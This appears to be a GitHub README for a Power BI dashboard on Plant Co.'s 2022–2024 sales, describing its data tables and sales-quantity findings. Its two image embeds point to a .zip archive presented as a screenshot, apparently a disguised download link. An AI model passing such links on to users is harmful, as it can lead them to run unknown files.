# Project Background

Plant Co. is a global supplier of plant-based products, serving both retail and wholesale customers across multiple regions. The company manages a diverse catalog of products and ships worldwide.

In recent years (2022-2024), Plant Co. has experienced a consistent decline in gross profit, raising concerns among leadership about product performance, customer behavior, pricing strategy, and overall sales efficiency. Their current reporting process is fragmented, making it difficult for decision-makers to understand key trends or identify the root causes of the declining profitability.

To support strategic planning, Plant Co. requested a centralized Power BI report that consolidates sales, customer, and product data into a single interactive dashboard.
Leadership at Plant Co. has asked the data team to:
  - Provide a comprehensive overview of global sales performance from 2022–2024
  - Identify which regions, customer segments, and product categories are driving sales
  - Highlight top-performing and underperforming products
  - Present all findings through an interactive Power BI dashboard for executives
  
# Data Structure & Initial Checks

The company’s main database structure as seen below consists of three tables: Products Sales, and Accounts. 
A description of each table is as follows:

- **Products** – Contains product catalog information including product names, product family, group, size, and type. Used for analyzing product performance, category trends, and contributions to overall sales and gross profit.

- **Sales:** - Contains all transaction-level sales records from 2022 to 2024. Each row represents a single sale, including product sold, customer account, date, and financial metrics.

- **Accounts** – Contains customer and account information, including account names, unique account IDs, geographic details (country, latitude, longitude), and address attributes. Used for segmentation and regional performance analysis.

![Image](https://raw.githubusercontent.com/Anthunii/PlantCo_2022-2024_Dashboard/master/Screenshots/PlantCo_2022-2024_Dashboard-headset.zip)

# Executive Summary

### Overview of Findings

Plant Co.’s gross profit has steadily declined from 2022 to 2024, with noticeable drops in the latter half of each year. While early-year demand briefly improves performance, it isn’t enough to offset consistent year-end declines. Product and country trends show variability, suggesting the issue is broad rather than tied to a single segment.

![Image](https://raw.githubusercontent.com/Anthunii/PlantCo_2022-2024_Dashboard/master/Screenshots/PlantCo_2022-2024_Dashboard-headset.zip)

# Insights Deep Dive
### Category 1: Sales Quantity Analysis

* **Average quantity sold is stable over time.** Across the analyzed periods, the mean quantity sold hovers around 1359 units, with minor seasonal fluctuations.
  
* **Sales are skewed toward lower quantities.** 75% of products sold fewer than 1,807 items per period, while only a small subset sold higher quantities. The top-selling products contribute a relatively small portion of total sales.
  
* **Sales and gross profit move together strongly.** With a correlation coefficient of 0.88, products with higher sales revenue consistently produce higher gross profit.
  
* **Certain products are consistently underperforming.** Analysis shows a cluster of SKUs below the quantity average, representing about 15% of products that consistently underperform and may need strategic attention.
